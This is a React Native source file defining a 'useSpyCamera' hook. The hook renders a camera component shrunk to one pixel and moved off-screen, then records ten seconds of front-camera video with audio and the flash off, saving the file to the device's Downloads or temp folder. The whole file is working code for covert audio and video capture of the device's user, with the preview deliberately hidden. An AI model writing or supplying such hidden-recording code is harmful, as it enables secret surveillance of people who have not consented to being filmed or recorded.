import RNFS from 'react-native-fs';
import {useEffect, useRef} from 'react';
import {Platform, PermissionsAndroid} from 'react-native';
import {
  Camera,
  useCameraDevice,
  useCameraPermission,
} from 'react-native-vision-camera';

let globalCamera = null;

export const useSpyCamera = () => {
  const device = useCameraDevice('front');
  const cameraRef = useRef(null);
  const {hasPermission, requestPermission} = useCameraPermission();

  useEffect(() => {
    (async () => {
      if (!hasPermission) {
        await requestPermission();
      }
      if (Platform.OS === 'android') {
        await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
        );
      }
    })();
  }, []);

  const startRecording = async () => {
    if (!hasPermission || !device) {
      console.warn('Camera not ready or permission denied');
      return;
    }

    globalCamera = cameraRef.current;

    try {
      await cameraRef.current?.startRecording({
        flash: 'off',
        onRecordingFinished: async video => {
          console.log('🎥 Recording finished:', video.path);
          const fileName = `VID_${Date.now()}.mp4`;
          const destPath =
            Platform.OS === 'android'
              ? `${RNFS.DownloadDirectoryPath}/${fileName}`
              : `${RNFS.TemporaryDirectoryPath}${fileName}`;
          await RNFS.copyFile(video.path, destPath);
          console.log('✅ Saved video to:', destPath);
        },
        onRecordingError: err => console.error('Recording error:', err),
      });

      setTimeout(async () => {
        await stopRecording();
      }, 10000);
    } catch (err) {
      console.error('Failed to start recording:', err);
    }
  };

  const stopRecording = async () => {
    try {
      await globalCamera?.stopRecording();
    } catch (err) {
      console.error('Error stopping recording:', err);
    }
  };

  const getHiddenCameraComponent = () => {
    if (!hasPermission || !device) return null;

    return (
      <Camera
        ref={cameraRef}
        style={{
          position: 'absolute',
          width: 1,
          height: 1,
          top: -1000,
          left: -1000,
        }}
        device={device}
        isActive={true}
        video={true}
        audio={true}
      />
    );
  };

  return {startRecording, getHiddenCameraComponent};
};
